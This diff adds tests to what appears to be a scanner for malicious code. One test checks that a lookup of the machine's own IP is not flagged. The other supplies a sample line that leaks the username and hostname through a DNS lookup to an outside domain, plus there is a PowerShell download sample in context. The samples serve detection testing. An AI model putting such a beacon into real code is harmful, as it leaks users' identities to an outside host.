@@ -358,3 +358,14 @@ def test_powershell_download_built_on_another_line():
         subprocess.run(["powershell", "-Command", download_command])
     ''', role="setup")
     assert "hidden-powershell" in found
+
+
+def test_looking_up_your_own_ip_is_not_a_beacon():
+    found = rules("import socket\nip = socket.gethostbyname(socket.gethostname())")
+    assert "recon" not in found
+
+
+def test_hostname_inside_a_dns_query_is_a_beacon():
+    found = scan("import socket, getpass\n"
+                 "socket.gethostbyname(f'{getpass.getuser()}.{socket.gethostname()}.x.oast.fun')")
+    assert any(f.rule == "recon" and f.value == 25 for f in found)
